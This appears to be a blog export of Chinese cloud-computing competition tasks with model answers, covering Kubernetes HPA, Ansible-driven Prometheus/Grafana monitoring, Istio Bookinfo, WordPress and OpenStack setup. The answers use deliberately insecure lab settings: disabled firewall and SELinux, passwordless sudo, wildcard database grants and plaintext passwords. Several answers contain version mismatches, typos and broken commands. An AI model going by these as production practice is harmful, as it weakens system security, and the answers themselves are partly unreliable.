 #查看服务是否启动 ps -ef |grep apiserver|grep true #若报Error from server (NotFound): the server could not find the requested resource (get pods.metrics.k8s.io)vi /etc/kubernetes/manifests/kube-apiserver.yaml- --enable-aggregator-routing=true #在command中添加#修改配置文件vi metrics-server-0.3.6/deploy/1.8+/metrics-server-deployment.yaml   args：  - /metrics-server  - --kubelet-insecure-tls  - --kubelet-preferred-address-types=InternalIP  

2.启动服务
cd /root/metrics-server-0.3.6/deploy/1.8+kubectl apply -f .

6.配置弹性伸缩编写 deployment-nginx-hpa.yaml 文件，要求最小副本数 1，最大副本数 3,当整体的资源利用率超过 80%的时候实现自动扩容，将 yaml 文件提交至答题框。【2 分】
deployment-nginx-hpa.yaml
apiVersion: autoscaling/v1kind: HorizontalPodAutoscalermetadata:  name: nginx-hpa  namespace: defaultspec:  maxReplicas: 3  minReplicas: 1  targetCPUUtilizationPercentage: 80  scaleTargetRef:    apiVersion: apps/v1    kind: Deployment    name: nginx            

7.压力测试安装 httpd-tools 工具，通过 service 提供的对外访问接口进行压力测试，验证 HPA 弹性伸缩功能，将 HPA 状态和 POD 状态截图提交至答题框。【2 分】
yum install -y httpd-tools#测试命令 ab -n 请求次数 -c 并发数 访问地址         ab -n 1000 -c 100 https://www.baidu.com/  表请求1000次中有100并发

C 场次题目：企业级应用的自动化部署和运维
任务 1 企业级应用的自动化部署（15 分）1. ansible 自动化运维工具的安装【3 分】请使用提供的软件包在 master 节点安装 ansible，安装完成后使用 ansible –version 命令验证是否安装成功。为所有节点添加 test 用户，设置用户密码为 000000。为 test 用户设置免密 sudo，配置 ssh 免密登录，使 master 节点能够免密登录所有节点的 test 用户。
将 ansible –version 命令和回显粘贴到答题框。
master
#安装依赖yum install -y jinja2 PyYAML cryptographyrpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpmansible --version

全部节点
useradd testpasswd test#设置免密sudo 在root    ALL=(ALL)       ALL下面添加visudotest ALL=(ALL) NOPASSWD:ALL

master
ssh-keygen ssh-copy-id test@192.168.200.100ssh-copy-id test@192.168.200.101ssh-copy-id test@192.168.200.102

2.ansible 自动化运维工具的初始化【3 分】创建 &#x2F;root&#x2F;ansible 目录作为工作目录，在该目录内创建 ansible.cfg 文件并完成以下配置，清单文件位置为 &#x2F;root&#x2F;ansible&#x2F;inventory，登录用户为 test，登录时不需要输入密码。设置并行主机数量为 2，允许 test 用户免密提权到 root。
将 ansible.cfg 文件内容粘贴到答题框。
mkdir /root/ansiblevi ansible.cfg[defaults]inventory=./inventoryforks=2remote_user=testask_pass=false[privilege_escalation]become=truebecome_user=rootbecome_ask_pass=false###########################[defaults]inventory=./inventoryforks=2remote_user=testask_pass=false[privilege_escalation]become=truebecome_method=sudobecome_user=rootbecome_ask_pass=false                       

3.主机清单的编写【2分】编写主机清单文件，创建 master 用户组，master 用户组内添加 master 主机；创建 node 用户组，node 组内添加 node1 和 node2 主机，主机名不得使用 IP 地址。
完成后执行 ansible-inventory –list 、ansible all -m ping 和 ansible all -a “id” 命令，将这三条命令返回结果粘贴到答题框。 
vi inventory[master]master[node]node1node2




4.使用自动化工具对 master 节点进行初始化【2 分】请编写 prometheus.yml 控制 master 主机组，使用对应模块将 SELinux 临时状态和开机启动状态也设置为 disabled。请使用 ansible 对应模块安装时间同步服务，使用文本编辑模块将该服务的作用域设置为 0.0.0.0&#x2F;0，并设置状态为启动和开机自动启动。首先将提供的 prometheus-2.37.0.linux-amd64.tar.gz 使用文件拷贝模块将该压缩包拷贝到目标主机的&#x2F;usr&#x2F;local&#x2F; 下，使用 shell 模块解压该压缩包。
完成后提交 yml 文件和和 ansible 运行结果。
vi prometheus.yml 
- hosts: master  remote_user: root  tasks:    - name: SELINUX=disabled      selinux: state=disabled    - name: stop firewalld      shell: &#x27;sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld&#x27;    - name: install chrony      yum: name=chrony state=present    - name: allow 0.0.0.0/0      blockinfile: path=/etc/chrony.conf block=&quot;allow 0.0.0.0/0&quot;    - name: start chrony      service: name=chronyd state=started enabled=yes    - name: copy promethus      copy: src=/root/prometheus-2.37.0.linux-amd64.tar.gz dest=/usr/local/    - name: tar prometheus      shell: &#x27;sudo tar -zxvf /usr/local/prometheus-2.37.0.linux-amd64.tar.gz -C /usr/local&#x27;                      


5.使用自动化运维工具完成企业级应用的部署【5 分】编写 prometheus.yml.j2 模板文件，将所有 node 节点信息添加到该文件中，但是被管节点的主机名信息必须使用变量 IP 地址可以手动输入。完成后请创建node_exporter.yml 文件，编写第一个 play，将该 play 命名为 node，该 play控制的主机组为 node。使用 ansible 模块将 node_exporter-1.3.1.linux-amd64.tar.gz 发送到 node 主机组的 &#x2F;usr&#x2F;local&#x2F; 下，使用一个 shell 模块解压该压缩包，并启动该服务。随后编写第二个 play，将第二个 play 命名为 master，第二个 play 控制 master 节点。首先使用 ansible 模块将 prometheus.yml.j2 文件传输到 master 节点，然后使用 script 模块将 prometheus 启动。使用对应模块将 grafana-8.1.2-1.x86_64.rpm 包发送到被控节点的 &#x2F;mnt&#x2F; 目录下，然后使用对应模块将该软件包安装，安装完成后设置 grafana 服务启动并设置开机自动启动。使用浏览器登录 prometheus 查看 prometheus 是否成功监控所有 node 节点。
请将浏览器反馈的结果截图、prometheus.yml.j2 文件的内容、node_exporter.yml 文件内容及运行结果提交到答题框。
---- hosts: node  name: node  tasks:    - name: copy node_expose      copy: src=/root/node_exporter-1.3.1.linux-amd64.tar.gz dest=/usr/local/    - name: tar node_expose      shell: &#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;    - name: start node_export      shell: &#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;- hosts: master  name: master  vars:    node1: 192.168.200.101    node2: 192.168.200.102  tasks:    - name: template j2      template: src=./prometheus.yml.j2 dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml    - name: start prometheus      shell: &#x27;sudo nohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;&#x27;    - name: copy grafana      copy: src=/root/grafana-8.1.2-1.x86_64.rpm dest=/mnt/    - name: install repaired      shell: &#x27;sudo yum install -y fontconfig urw-fonts &#x27;    - name: install grafana      shell: &#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;    - name: enable gtafana      service: name=grafana-server state=started enabled=yes

prometheus.j2
# my global configglobal:  scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.  # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting:  alertmanagers:    - static_configs:        - targets:          # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.rule_files:  # - &quot;first_rules.yml&quot;  # - &quot;second_rules.yml&quot;# A scrape configuration containing exactly one endpoint to scrape:# Here it&#x27;s Prometheus itself.scrape_configs:  # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.  - job_name: &quot;prometheus&quot;    # metrics_path defaults to &#x27;/metrics&#x27;    # scheme defaults to &#x27;http&#x27;.    static_configs:      - targets: [&quot;localhost:9090&quot;]  - job_name: &quot;node_exposed&quot;    static_configs:      - targets: [&quot;&#123;&#123;node1&#125;&#125;:9100&quot;,&quot;&#123;&#123;node2&#125;&#125;:9100&quot;]

任务 2 企业级应用的运维（12 分）1.使用 prometheus 监控 mysqld 服务【3 分】 将提供的 mysqld_exporter-0.14.0.linux-amd64.tar.gz 发送到 agent 虚拟机 &#x2F;usr&#x2F;local&#x2F; 目录下解压并安装 mariadb 服务。进入 mariadb 数据库中创建 mysqld_monitor 用户并授权，然后创建 mariadb 配置文件，内容为数据库用户名密码。启动 mysqld_exporter 组件确保 9104 端口启动。回到 prometheus 节点修改 prometheus.yml 文件并添加 mysql 被监控信息。重启 prometheus，随后web 界面刷新并查看 mysqld 被控信息。 
将以上操作提交到答题框。
vi mysqld_exporter.yml
---- hosts: node  name: node   tasks:    - name: copy mysqld_exporter      copy: src=/root/mysqld_exporter-0.14.0.linux-amd64.tar.gz dest=/usr/local/    - name: tar it      shell: &#x27;sudo tar -zxvf /usr/local/mysqld_exporter-0.14.0.linux-amd64.tar.gz -C /usr/local&#x27;    - name: anzhuang mariadb      shell: &#x27;sudo yum install -y mariadb*&#x27;    - name: start mysqld      service: name=mariadb state=started enabled=yes

在agent节点
#授权mysql&gt;grant select,replication client,process ON *.* to &#x27;mysql_monitor&#x27;@&#x27;localhost&#x27; identified by &#x27;123&#x27;;&gt;flush privileges;&gt; quit#创建一个mariadb文件，并写上连接的用户和密码vi /usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf[client]user=mysql_monitorpassword=123#启动mysqld_exporternohup /usr/local/mysqld_exporter-0.14.0.linux-amd64/mysqld_exporter --config.my-cnf=/usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf &amp;#确认是否开启netstat -nltp | grep 9104

回到master节点
vi /usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml - job_name: &#x27;mysql&#x27;   static_configs:     - targets: [&#x27;node1:9104&#x27;,&#x27;node2:9104&#x27;]          #重启服务pkill prometheusnohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;

2.安装altermanager报警组件将提供的alertmanager-0.21.0.linux-amd64.tar.gz上传到prometheus节点 &#x2F;usr&#x2F;local&#x2F; 目录下并解压，创建软连接 alertmanager-0.23.0.linux-amd64&#x2F; alertmanager。创建 service 启动文件，然后启动 alertmanager 查看 9093端口。在 prometheus.yml 配置文件中添加 alertmanager 信息并重新启动 prometheus 服务，在 agent 上停止 node_exporter 服务。到 web 界面中查看警报管理器状态是否正常和 agent 状态是否异常。
将操作命令及截图提交到答题框。
prometheus节点
tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /usr/local/ln -s alertmanager-0.23.0.linux-amd64/ alertmanager#创建service启动文件vi /usr/lib/systemd/system/alertmanager.service[Unit]Description=alertmanager[Service]ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.ymlExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=on-failure[Install]WantedBy=multi-user.targetsystemctl daemon-reloadsystemctl start alertmanager#修改Prometheus配置文件  - job_name: &#x27;altermanager&#x27;    static_configs:      - targets: [&#x27;localhost:9093&#x27;]      pkill prometheusnohup /usr/local/prometheus/prometheus.yml &amp;

agent:
pkill node_exporternohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;


3.alertmanager 告警邮件文件编写【3 分】Prometheus 虚拟机 &#x2F;usr&#x2F;local&#x2F;alertmanager&#x2F; 中存在着一个 alertmanager.yml 文件，请根据提供的地址和模板编写告警所发送到的 email 邮箱地址信息。
将配置文件中编写的内容提交到答题框。 
  smtp_auth_username: &quot;1234567890@qq.com&quot; # 登录用户名  smtp_auth_password: &quot;auth_pass&quot; # 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。  smtp_require_tls: false # 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。route:  receiver: ops  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。  group_interval: 5m # 如果组内内容不变化，合并为一条警报信息，5m后发送。  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警。  group_by: [alertname]  # 报警分组  routes:      - match:          team: operations        group_by: [env,dc]        receiver: &#x27;ops&#x27;      - receiver: ops # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送        group_wait: 10s        match:          team: operations# 接收器指定发送人以及发送渠道receivers:# ops分组的定义- name: ops  email_configs:  - to: &#x27;9935226@qq.com,xxxxx@qq.com&#x27; # 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。    send_resolved: true    headers:      from: &quot;警报中心&quot;      subject: &quot;[operations] 报警邮件&quot;      to: &quot;小煜狼皇&quot;

4.alertmanager 告警规则编写【3 分】在 prometheus 虚拟机的 prometheus 路径下存在一个 &#x2F;rules 目录，目录下有一个 node_rules.yml 文件。请根据提供信息仿照模板编写：（1）内存大于 50%报警规则； 
（2）cpu 资源利用率大于 75%报警规则； 
（3）主机磁盘每秒读取数据&gt;50MB%报警规则； 
部门名称可为工位号，将配置文件内容提交到答题框。
groups:- name: node_health  rules:  - alert: HighMemoryUsage    expr: node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes &lt; 0.5    for: 1m    labels:      severity: warning    annotations:      summary: High memory usage  - alert: HighCPUUseage    expr: 1-sum(increase(node_cpu_seconds_total&#123;mode=&quot;idle&quot;&#125;[1m])) by (instance) / sum(increase(node_cpu_seconds_total[1m])) by (instance) &gt; 0.75    for: 1m    labels:      severity: warning    annotations:      summary: High CPU usage  - alert: HighReadTime    expr: sum(irate(node_disk_read_bytes_total[1m])) by (instance) &gt; 50    for: 1m    labels:      severity: warning    annotations:      summary: High Read Time

任务3 企业级微服务运维（13 分）1.在 Kubernetes 集群安装 istio【4 分】一定要先安装mertics
将 istio-1.10.1-linux-amd64.tar 上传至 master 节点并解压至&#x2F;root 目录下，将 &#x2F;istio 目录内容器镜像文件上传至各 node 节点中并且加载，完成 istio 初始化安装，将部署成功后三台 POD 状态截图提交答题框。
tar -zxvf  istio-1.10.1-linux-amd64.tarcd istio-1.10.1/cp bin/istionctl /usr/local/bin#通过istioctl安装istioistioctl install --set profile=demoThis will install the Istio 1.13.4 demo profile with [&quot;Istio core&quot; &quot;Istiod&quot; &quot;Ingress gateways&quot; &quot;Egress gateways&quot;] components into the cluster. Proceed? (y/N) y✔ Istio core installed                                                           ✔ Istiod installed                                                               ✔ Egress gateways installed                                                      ✔ Ingress gateways installed                                                     ✔ Installation complete                                                          Making this installation the default for injection and validation.

完成安装后查看相应服务是否成功启动
 kubectl get pod -n istio-system NAME                                   READY   STATUS    RESTARTS   AGEistio-egressgateway-5dc6c98fbc-vdlml   1/1     Running   0          3d1histio-ingressgateway-87bbdd549-8776n   1/1     Running   0          3d1histiod-56b7b78cb5-94c69                1/1     Running   0          3d1h

2.部署基于在线书店 bookinfo【6 分】Bookinfo 是一个在线书店微服务应用，Bookinfo 应用分为四个单独的微 
服务：
（1）productpage。这个微服务会调用 details 和 reviews 两个微服务，用来生成页面。
（2）details。 这个微服务中包含了书籍的信息。
（3）reviews。这个微服务中包含了书籍相关的评论。它还会调用 ratings 微服务。
（4）ratings。这个微服务中包含了由书籍评价组成的评级信息。reviews 微服务有 3 个版本：v1 版本不会调用 ratings 服务；v2 版本会 调用 ratings 服务，并使用 1 到 5 个黑色星形图标来显示评分信息；v3 版本会调用 ratings 服务，并使用 1 到 5 个红色星形图标来显示评分信息。实现该应用服务网格的部署，利用 Istio 控制平面为应用提供服务路由、 监控数据收集以及策略实施等功能。部署架构如下：

（1)编写 Dockerfile 构建 productpage:v1.0 镜像，具体要求如下： 
基础镜像：centos:7.9.2009； 
安装 Python3.6.8 工具； 
安装 productpage 服务并设置开机自启
（2）规划应用微服务部署架构，在容器集群中通过修改微服务应用的 yaml 
文件来完成 bookinfo 微服务应用的部署。
边车注入(手动注入)
istioctl kube-inject -f samples/bookinfo/platform/kube/bookinfo.yaml -o samples/bookinfo/platform/kube/bookinfo-istio.yaml

（3）在容器集群中设置熔断规则，对 Bookinfo 其中的 productpage 微服务设置熔断规则，并通过负载 fortio 测试客户端触发熔断机制进行验证。
vi destinationrule.yaml
apiVersion: networking.istio.io/v1beta1kind: DestinationRulemetadata:  name: productpagespec:  host: productpage  trafficPolicy:    connectionPool:      tcp:        maxConnections: 1      http:        http1MaxPendingRequests: 1        maxRequestsPerConnection: 1    outlierDetection:      consecutive5xxErrors: 1      interval: 1s      baseEjectionTime: 3m      maxEjectionPercent: 100

部署fortio文件进行访问测试
kubectl apply -f samples/httpbin/sample-client/fortio-deploy.yamlkubectl exec fortio-deploy-5bb66f84-rpck8  -c fortio -- /usr/bin/fortio load  -qps 0 -n 200 -loglevel Warning  http://productpage:9080/

3.部署网关接口实现对外服务【3 分】通过 istio-1.10.1&#x2F;samples&#x2F;bookinfo&#x2F;networking&#x2F;bookinfo-gateway.yaml 部署 bookinfo 网关，通过外部浏览器登陆 bookinfo，请将浏览器反馈的结果截图提交答题框.。
kubectl apply -f istio-1.10.1/samples/bookinfo/networking/bookinfo-gateway.yaml#将istio-system空间的istio-ingressgateway 的svc中kubectl edit istio-ingressgateway -n istio-system改为NodePort

进行访问
http://192.168.200.155:30221/productpage

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Ansible搭建wordpress</title>
    <url>/posts/944d69ee.html</url>
    <content><![CDATA[一.ansible搭建wordpress基于lamp构建wordpress



master
192.168.200.100
控制节点



node1
192.168.200.101
web服务器


node2
192.168.200.102
mysql服务器


vi &#x2F;etc&#x2F;ansible&#x2F;host
[master]master[web]192.168.200.101node1[database]192.168.200.102node2

vi wordpress.yaml
---# hosts: 后面可写主机组名或主机名- hosts: all  remote_user: root  # 定义变量  vars:    db_pkgs:      # 以下的-为变量“值”，也就是在引用db_pkgs变量时，可取变量中的值      - mariadb      - mariadb-server    web_pkgs:      - httpd      - php      - php-gd      - php-mysql      - gd  # tasks：ansible机器要执行操作的任务列表（依次执行）  tasks:    # 安装mariadb    - name: install mariadb    # 引用变量时使用&#123;&#123;&#125;&#125;      yum: name=&#123;&#123; db_pkgs &#125;&#125; state=latest      when: ansible_nodename == &#x27;node2&#x27;    # 安装webserver相关服务（httpd、php）    - name: install webserver      yum: name=&#123;&#123; web_pkgs &#125;&#125; state=latest      when: ansible_nodename == &#x27;node1&#x27;    # 启动mariadb    - name: start mariadb      service: name=mariadb state=started      # 触发（类似c语言的中断信号），触发后会去handlers执行相关操作      notify: create_db      # when判断，用来针对某主机执行的操作，比如这里是指定对database组里的机器进行操作      when: ansible_nodename == &#x27;node2&#x27;    # 启动webserver相关服务    - name: start webserver      service: name=httpd state=started      when: ansible_nodename == &#x27;node1&#x27;    # 将项目包发送到指定机器（及解包）      - name: to package      unarchive: src=/root/wordpress-4.9.18-zh_CN.tar.gz dest=/var/www/html      when: ansible_nodename == &#x27;node1&#x27;    # 修改指定机器网站发布目录属组/主    - name: chown      file: owner=apache group=apache recurse=yes path=var/www/html      when: ansible_nodename == &#x27;node1&#x27;  # 触发操作      handlers:    # 注意：这里的name名字必须和notify的触发名称保持一致    - name: create_db      # 调用shell解释器执行相关命令      shell: mysql -e &quot;create database wordpress;grant all on *.* to &#x27;zrs&#x27;@&#x27;%&#x27; identified by &#x27;015210&#x27;;flush privileges;&quot;      # 同样这里是针对database这个主机组里的机器      when: ansible_nodename == &#x27;node2&#x27;

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖大赛山东选拔题</title>
    <url>/posts/840d388d.html</url>
    <content><![CDATA[A场次题目：OpenStack平台部署与运维业务场景：
某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化，弹性分配，集中管理，性能优化以及统一安全认证等。系统结构如下图：
企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：



设备名称
主机名
接口
ip地址



云服务器1
controller
eth0，eth1
私网：192.168.100.10&#x2F;24           私网：192.168.200.10&#x2F;24


云服务器2
compute
eth0，eth1
私网：192.168.100.20&#x2F;24         私网：192.168.200.20&#x2F;24


说明:
1.选手自行检查工位pc机硬件及网络是否正常;1.选手自行检查工位PC机硬件及网络是否正常；
⒉.竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统;
3.考试用到的软件包都在云主机&#x2F;opt下。3.考试用到的软件包都在云主机&#x2F;OPT下.
4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接.
任务1私有云平台环境初始化(5分)1.初始化操作系统控制节点主机名为controller，计算节点主机名为compute，修改hosts文件将IP地址映射为主机名，使用一条命令关闭firewalld并设置开机不自动启动。
请将cat &#x2F;etc&#x2F;hosts命令的返回结果提交至答题框。【2分】
cat /etc/hosts192.168.100.10 controller192.168.100.20 compute

过程：
controller节点
hostnamectl set-hostname controller#修改主机映射vi /etc/hosts192.168.100.10 controller192.168.100.20 compute#关闭防火墙和关机自启动systemctl stop firewalld &amp;&amp; systemctl disable firewalld#安全策略setenforce 0vi /etc/selinux/configSELINUX=permissive

compute节点
hostnamectl set-hostname compute#修改主机映射vi /etc/hosts192.168.100.10 controller192.168.100.20 compute#关闭防火墙和关机自启动systemctl stop firewalld &amp;&amp; systemctl disable firewalld#安全策略setenforce 0vi /etc/selinux/configSELINUX=permissive

⒉.挂载安装光盘镜像将提供的CentOS-7-x86_64-DVD-1804.iso和bricsskills_cloud_iaas.iso光盘镜像复制到controller节点&#x2F;root目录下，然后在&#x2F;opt目录下使用命令创建&#x2F;centos目录和&#x2F;iaas目录，并将镜像文件centOS-7-x86_64-DVD-1804.iso挂载到&#x2F;centos目录下，将镜像文件bricsskills_cloud_iaas.iso挂载到&#x2F;iaas目录下
请将ls &#x2F;opt&#x2F;iaas&#x2F;命令的返回结果提交至答题框。【1分】
(镜像未拷贝，用省赛即可)
[root@controller ~]# ls /opt/iaas/iaas-repo  images

过程：
controller节点
#创建目录 mkdir /opt/centosmkdir /opt/iaas#镜像挂载mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/mount chinaskills_cloud_iaas.iso /opt/iaas/

3.设置yum源将controller节点和compute节点原有的yum源移动到&#x2F;home目录，为controller节点创建本地yum源,yum源文件名为local.repo;为compute节点创建ftp源，yum源文件名为ftp.repo，其中ftp服务器地址为controller节点,配置ftp源时不要写IP地址。
请将ftp.repo的内容提交至答题框。【0.5分】
[root@compute ~]# cat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://controller/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=ftp://controller/iaas/iaas-repogpgcheck=0enabled=1

过程：
controller节点
mv /etc/yum.repos.d/* /home/#编写本地yum源vi /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=file:///opt/iaas/iaas-repogpgcheck=0enabled=1

compute节点
mv /etc/yum.repos.d/* /home/vi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://controller/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=ftp://controller/iaas/iaas-repogpgcheck=0enabled=1

4.搭建文件共享服务器在Controller节点上安装vsftp服务并设置开机自启动，将&#x2F;opt目录设为共享目录重启服务生效。
请将vsftp配置文件中修改的行提交至答题框。【0.5分】
[root@controller ~]# cat /etc/vsftpd/vsftpd.confanon_root=/opt/

controller节点
#安装vsftpyum install -y vsftpd#修改配置文件vi /etc/vsftpd/vsftpd.confanon_root=/opt/#启动服务systemctl start vsftpdsystemctl enable vsftpd

5.系统调优-脏数据回写Linux系统内存中会存在脏数据，一般系统默认脏数据30秒后会回写磁盘,修改配置文件，要求将回写磁盘的时间临时调整为60秒。
请使用sysctl -p命令将返回结果提交至答题框。【1分】
[root@controller ~]# sysctl -pvm.dirty_expire_centisecs = 6000

过程：
#系统内部数据一般保存在/proc/sys/下,脏数据回写在/proc/sys/vm/vm.dirty_expire_centisecs#sysctl -p 默认路径是 /etc/sysctl.conf，但是其文件在sys下寻找并修改配置文件，若要修改需要指定vi /etc/sysctl.conf vm.dirty_expire_centisecs= 6000sysctl -pvm.dirty_expire_centisecs = 6000

任务2 OpenStack搭建任务（10分）root密码以实际为准
1.修改变量文件在控制节点和计算节点上分别安装iaas-xiandian软件包，修改配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh)。修改完成后使用命令生效该变量文件，并然后执行echo $INTERFACE_IP命令。
请将echo $INTERFACE_IP命令的返回结果提交至答题框。【0.5分】
[root@controller ~]# echo $INTERFACE_IP192.168.100.10[root@compute ~]# echo $INTERFACE_IP192.168.100.20

过程：
controller
yum install -y iaas-xiandianvi /etc/xiandian/openrc.sh#将配置文件传到compute目录下scp /etc/xiandian/openrc.sh root@compute:/etc/xiandian/openrc.sh#使配置文件生效source /etc/xiandian/openrc.shecho $INTERFACE_IP  192.168.100.10

compute
yum install -y iaas-xiandian#将配置文件的INTERFACE_IP改为compute的ipsource /etc/xiandian/openrc.shecho $INTERFACE_IP  192.168.100.20

2.controller节点和compute节点分别执行iaas-pre-host.sh脚本请将执行sh文件的命令提交至答题框。【1分】
iaas-pre-host.sh

3.搭建数据库组件执行iaas-install-mysql.sh脚本，在controller节点会自行安装mariadb、memcached、rabbitmq等服务和完成相关配置。执行完成后修改配置文件将memcached最大连接数修改为2048。
请将ps aux | grep memcached命令的返回结果提交至答题框。【1分】
[root@controller sysconfig]# ps aux | grep memcachedmemcach+  25218  0.0  0.1 443040  4212 ?        Ssl  16:36   0:00 /usr/bin/memcached -p 11211 -u memcached -mroot      25232  0.0  0.0 112720   984 pts/1    S+   16:36   0:00 grep --color=auto memcached

过程：
#执行脚本iaas-install-mysql.sh#修改配置文件cd /etc/sysconfig/vi memcachedMAXCONN=&quot;2048&quot;#重启服务systemctl restart memcached#查看 ps aux | grep memcachedmemcach+  25218  0.0  0.1 443040  4212 ?        Ssl  16:36   0:00 /usr/bin/memcached -p 11211 -u memcached -m 64 -c 2048 -l 127.0.0.1,::1,controllerroot      25232  0.0  0.0 112720   984 pts/1    S+   16:36   0:00 grep --color=auto memcached

4.搭建认证服务组件执行iaas-install-keystone.sh脚本，在controller节点上会自行安装keystone服务和完成相关配置。完成后使用openstack命令查看当前用户列表。
请将openstack查看用户列表的命令提交至答题框。【1分】
[root@controller sysconfig]# openstack user list+----------------------------------+-------+| ID                               | Name  |+----------------------------------+-------+| c75f855190ab4f50b9b7175ea8a90b44 | admin || fb61c950d2874cafaff6e57f406e103b | demo  |+----------------------------------+-------+

过程：
#安装脚本iaas-install-keystone.sh#生效身份验证source /etc/keystone/admin-openrc.sh#查看用户列表openstack user list+----------------------------------+-------+| ID                               | Name  |+----------------------------------+-------+| c75f855190ab4f50b9b7175ea8a90b44 | admin || fb61c950d2874cafaff6e57f406e103b | demo  |+----------------------------------+-------+

5.搭建镜像服务组件执行iaas-install-glance.sh脚本，在controller 节点会自行安装glance服务和完成相关配置。完成后使用openstack命令将cirros-0.3.4-x86_64-disk.img上传到controller节点的&#x2F;root目录下，并命名为cirros。
请将镜像上传的操作命令和返回结果提交至答题框。【1分】
[root@controller sysconfig]# openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img+------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     || container_format | bare                                                 || created_at       | 2022-10-08T08:56:01Z                                 || disk_format      | qcow2                                                || file             | /v2/images/70344b58-7c4f-43b0-b5de-15dd898d1293/file || id               | 70344b58-7c4f-43b0-b5de-15dd898d1293                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | e6dc2936211947c3b924187b48ffa8fb                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 13287936                                             || status           | active                                               || tags             |                                                      || updated_at       | 2022-10-08T08:56:01Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+

过程：
#执行脚本iaas-install-glance.sh#上传镜像openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img

6.搭建计算服务组件在controller节点和compute节点分别执行iaas-install-nova-controller.sh和iaas-install-nova-compute.sh脚本，会自行安装nova服务和完成相关配置。然后使用命令列出能提供计算资源的节点。
请将nova service-list命令的返回结果提交至答题框。【2分】
[root@controller sysconfig]# nova service-list+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+| Id                                   | Binary           | Host       | Zone     | Status  | State | Updated_at                 | Disabled Reason | Forced down |+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+| c6a665b2-2cd7-44ca-9d75-32e7da6f4acf | nova-scheduler   | controller | internal | enabled | up    | 2022-10-08T09:07:15.000000 | -               | False       || ce9d4037-9d16-4f16-8bbd-7015ddc74345 | nova-consoleauth | controller | internal | enabled | up    | 2022-10-08T09:07:15.000000 | -               | False       || 8697a2e3-e5da-4f53-bc0d-e56f338027a5 | nova-conductor   | controller | internal | enabled | up    | 2022-10-08T09:07:16.000000 | -               | False       || fc6eb5ca-c245-47f6-b9d9-24426f269e3f | nova-compute     | compute    | nova     | enabled | up    | 2022-10-08T09:07:19.000000 | -               | False       || 1bd34d8c-ff2a-4c64-b426-a41dacf04bc2 | nova-compute     | controller | nova     | enabled | up    | 2022-10-08T09:07:22.000000 | -               | False       |+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+

过程
controller
iaas-install-nova-controller.sh#修改配置文件vi /etc/xiandian/openrc.shiaas-install-nova-compute.sh#修改完配置文件后改回

compute
iaas-install-nova-compute

controller：
nova service-list

